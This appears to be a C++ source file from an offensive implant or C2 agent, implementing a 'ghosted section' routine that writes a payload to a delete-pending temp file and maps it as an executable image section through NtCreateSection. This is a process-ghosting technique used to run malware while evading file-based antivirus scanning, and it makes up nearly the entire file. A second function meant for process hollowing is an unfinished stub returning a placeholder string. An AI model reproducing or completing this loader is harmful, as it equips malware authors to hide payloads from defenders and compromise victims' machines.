//
// Created by diago on 2024-05-27.
//

#include "injection.hpp"

HANDLE
tasking::create_ghosted_section(const std::string &payload_buffer) {

    FILE_DISPOSITION_INFO file_dispos   = { 0 };
    char temp_directory_path[MAX_PATH]  = { 0 };
    char temp_file_name[MAX_PATH]       = { 0 };

    HANDLE              hfile           = nullptr;
    HANDLE              hsection        = nullptr;
    fnNtCreateSection   pcreate_section = nullptr;

    NTSTATUS            status          = ERROR_SUCCESS;
    uint32_t            bytes_written   = 0;

    //------------------------------------------------------//

    auto _ = defer([&]() {
        CLOSE_HANDLE(hfile);
    });

    pcreate_section = reinterpret_cast<fnNtCreateSection>\
        (GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "NtCreateSection"));

    if(pcreate_section == nullptr) {
        return nullptr;
    }


    if(!GetTempPathA(MAX_PATH, temp_directory_path)) {
        return nullptr;
    }

    if(!GetTempFileNameA(temp_directory_path, "BPM", 0, temp_file_name)) {
        return nullptr;
    }

    hfile = CreateFileA(
        temp_file_name,
        GENERIC_READ    | GENERIC_WRITE | DELETE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        nullptr,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        nullptr
    );

    if(hfile == INVALID_HANDLE_VALUE) {
        return nullptr;
    }


    file_dispos.DeleteFile = TRUE;
    if(!SetFileInformationByHandle(
        hfile,
        FileDispositionInfo,
        &file_dispos,
        sizeof(file_dispos)
    )) {
        return nullptr;
    }

    if(!WriteFile(
        hfile,
        payload_buffer.data(),
        payload_buffer.size(),
        reinterpret_cast<LPDWORD>(&bytes_written),
        nullptr
    )) {
        return nullptr;
    }

    status = pcreate_section(
        &hsection,
        SECTION_ALL_ACCESS,
        nullptr,
        nullptr,
        PAGE_READONLY,
        SEC_IMAGE,
        hfile
    );

    if(status != ERROR_SUCCESS) {
        return nullptr;
    }

    return hsection;
}


std::string
tasking::runexe(bool hollow, const std::string& file_buffer) {

    return "dsfsdfsd";
}